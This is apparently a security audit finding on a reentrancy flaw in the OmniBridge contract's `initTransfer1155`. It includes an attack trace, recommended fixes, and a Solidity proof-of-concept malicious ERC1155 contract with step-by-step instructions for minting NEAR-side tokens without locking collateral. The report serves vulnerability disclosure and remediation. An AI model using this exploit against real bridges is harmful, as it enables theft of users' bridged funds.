Audit Report

## Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Allows `InitTransfer` Event Emission Without Token Custody — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`initTransfer1155` increments `currentOriginNonce` before making an external call to an attacker-controlled ERC1155 contract, then reads `currentOriginNonce` again after that call for both `initTransferExtension` and the `InitTransfer` event emission. There is no reentrancy guard anywhere in the contract. A malicious ERC1155 token can re-enter `initTransfer1155` from within its `safeTransferFrom` implementation, causing the bridge to emit a valid `InitTransfer` event with a legitimate nonce without ever receiving any ERC1155 tokens, enabling theft of NEAR-side funds.

## Finding Description

In `OmniBridge.initTransfer1155` (lines 439–490):

1. **Line 448** — `currentOriginNonce += 1` increments the nonce to N.
2. **Line 458** — `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — external call to an attacker-controlled contract.
3. **Lines 468–478** — `initTransferExtension(..., currentOriginNonce, ...)` reads the storage variable after the external call.
4. **Lines 480–489** — `emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)` reads the storage variable again.

No `nonReentrant` modifier exists on any function in the contract — confirmed by the complete absence of `ReentrancyGuard` or `nonReentrant` in all `.sol` files.

**Reentrancy trace:**

```
Outer call: currentOriginNonce → N
  → safeTransferFrom() on malicious ERC1155
      Inner call: currentOriginNonce → N+1
        → safeTransferFrom() returns (no re-entry, no tokens moved)
        → initTransferExtension(..., currentOriginNonce=N+1)  ← Wormhole VAA published
        → emit InitTransfer(..., nonce=N+1)
      [inner call returns]
  → initTransferExtension(..., currentOriginNonce=N+1)  ← Wormhole VAA published again
  → emit InitTransfer(..., nonce=N+1)
```

The `onERC1155Received` guard at lines 522–535 (checking `operator != address(this)`) is irrelevant: a malicious token's `safeTransferFrom` is not required to invoke `onERC1155Received` at all. It can re-enter `initTransfer1155` directly and return without moving any token balance.

The result: nonce N is permanently skipped; nonce N+1 is emitted twice; no ERC1155 tokens are ever deposited into the bridge. The NEAR-side `fin_transfer_callback` verifies only the emitter address against the registered factory and checks token decimals — it does not verify that the EVM bridge actually holds the corresponding ERC1155 tokens. It trusts the emitted event. NEAR deduplication by `TransferId` (origin chain + origin nonce) means only one of the two N+1 events is finalized, but that one event was produced without any collateral locked.

## Impact Explanation

**Critical.** An attacker emits a valid `InitTransfer` event from the EVM bridge without depositing any ERC1155 tokens. The NEAR bridge verifies the event via Wormhole VAA proof and releases NEAR-side tokens to the attacker. This constitutes unauthorized minting and direct theft of bridged funds, matching the allowed impact: *"Stealing, loss, double-spending, unauthorized minting, or permanent freezing of bridged funds across NEAR, EVM, or Wormhole-routed flows."*

## Likelihood Explanation

**Medium.** The attack requires: (1) deploying a malicious ERC1155 contract (trivial); (2) calling the permissionless `logMetadata1155` to register the token on-chain; (3) registering the token on NEAR via the emitted `LogMetadata` event (permissionless); (4) pre-funding the malicious contract with enough ETH to cover the Wormhole message fee for the inner reentrant call; (5) calling `initTransfer1155` with the malicious token. No admin access, no privileged keys, and no oracle manipulation are required. Any unprivileged EVM account can execute this.

## Recommendation

1. Import `ReentrancyGuardUpgradeable` from OpenZeppelin and apply the `nonReentrant` modifier to `initTransfer`, `initTransfer1155`, and `finTransfer`.
2. Capture `currentOriginNonce` into a local `uint64` variable immediately after incrementing it, and use that local variable exclusively for all subsequent reads within the same function call — this eliminates the read-after-reentrant-write pattern regardless of guard status.
3. Follow the checks-effects-interactions pattern: move the `safeTransferFrom` call to after all state writes and before event emission, or use a balance-check approach (record balance before and after the transfer and assert the delta equals `amount`).

## Proof of Concept

```solidity
contract MaliciousERC1155 {
    OmniBridge public bridge;
    uint256 public tokenId;
    bool private _attacking;

    constructor(address _bridge, uint256 _tokenId) {
        bridge = OmniBridge(_bridge);
        tokenId = _tokenId;
    }

    function safeTransferFrom(
        address, address, uint256, uint256 amount, bytes memory
    ) external {
        if (!_attacking) {
            _attacking = true;
            // Re-enter with 0 tokens ever moved; fund this contract with ETH for Wormhole fee
            bridge.initTransfer1155{value: WORMHOLE_FEE}(
                address(this), tokenId, uint128(amount), 0, 0,
                "near:attacker.near", ""
            );
            _attacking = false;
        }
        // Return without transferring any tokens
    }

    function balanceOf(address, uint256) external pure returns (uint256) {
        return type(uint256).max;
    }
}
```

**Steps:**
1. Deploy `MaliciousERC1155` pointing at `OmniBridge`; pre-fund it with ETH for the Wormhole fee.
2. Call `bridge.logMetadata1155(maliciousToken, tokenId)` to register the deterministic address.
3. Register the token on NEAR via the emitted `LogMetadata` event.
4. Call `bridge.initTransfer1155{value: outerFee}(maliciousToken, tokenId, amount, 0, 0, "near:attacker.near", "")`.
5. Bridge increments nonce to N, calls `maliciousToken.safeTransferFrom(...)`.
6. Malicious token re-enters: nonce becomes N+1, inner `safeTransferFrom` returns immediately (no tokens moved), inner call emits `InitTransfer(nonce=N+1)` and publishes Wormhole VAA.
7. Outer call resumes, reads `currentOriginNonce = N+1`, emits `InitTransfer(nonce=N+1)` again and publishes second Wormhole VAA — still no tokens deposited.
8. Relayer submits proof of the N+1 VAA to the NEAR bridge.
9. NEAR `fin_transfer_callback` verifies emitter address and token decimals, trusts the event, and mints NEAR-side tokens to `attacker.near`.
10. Attacker receives NEAR-side value with zero ERC1155 collateral locked on EVM.
